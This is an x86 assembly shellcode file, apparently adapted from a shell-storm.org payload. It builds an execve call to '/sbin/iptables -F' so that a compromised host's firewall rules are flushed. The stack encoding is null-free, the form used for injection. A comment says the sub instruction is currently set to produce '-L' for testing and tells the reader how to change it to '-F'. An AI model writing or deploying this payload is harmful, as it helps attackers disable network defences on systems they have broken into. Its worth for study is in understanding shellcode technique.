; The shellcode flushs the iptables  by running /sbin/iptables -F
; NOTE: Change sub dword instruction to make '-F'. Testing with -L for safety reasons!!!
; original size: 58 bytes
; http://shell-storm.org/shellcode/files/shellcode-361.php
; Original author: dev0id
; Author: John

jmp	short	callmemaybe

main:
	; Could also place DWORDS onto stack and pop into esi when complete; similar method as in sudoers
	pop ebx									; esi points to '/sbin/iptables'
	xor eax,eax							; eax = NULL
	push eax								; push NULL onto stack
	push 0xdeadbeef					; push random value onto stack
	sub dword [esp], 0xdead72c2	 ; '\0\0-F' appears on stack
	mov edx, esp						; edx points to '\0-F\0'
	push eax								; push NULL onto stack
	push edx								; push -F pointer
	push ebx								; push '/sbin/iptables' pointer
	mov ecx, esp 						; ecx points to [*'/sbin/iptables', *'-F']
	sub edx, edx						; edx = NULL
	mov al, 0x0b						; eax = execve() syscall
	int 0x80								; syscall

callmemaybe:
	call	main
	db '/sbin/iptables'
